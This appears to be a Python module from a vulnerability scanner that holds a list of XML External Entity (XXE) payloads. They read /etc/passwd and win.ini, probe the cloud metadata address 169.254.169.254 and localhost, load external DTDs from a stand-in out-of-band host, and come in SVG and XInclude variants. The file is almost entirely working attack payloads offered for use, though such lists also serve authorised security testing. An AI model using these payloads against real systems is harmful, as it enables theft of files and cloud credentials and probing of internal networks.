"""XXE payloads — file read, SSRF, blind OOB, error-based."""

NAME = "XML External Entity"
DESCRIPTION = "XXE detection and exploitation payloads for file read, SSRF, and blind OOB"
RISK = "HIGH"

PAYLOADS = [
    # Basic file read
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
    # Windows file read
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>""",
    # SSRF
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]><foo>&xxe;</foo>""",
    # Blind OOB
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://oob.example.com/xxe"> %xxe;]><foo>test</foo>""",
    # Parameter entity OOB
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://oob.example.com/xxe.dtd"> %xxe;]><foo>test</foo>""",
    # Error-based
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><foo>&xxe;</foo>""",
    # XXE via SVG
    """<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>""",
    # XXE via XInclude
    """<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>""",
    # DocType with external DTD
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://oob.example.com/xxe.dtd"> %dtd;]><foo>&send;</foo>""",
]
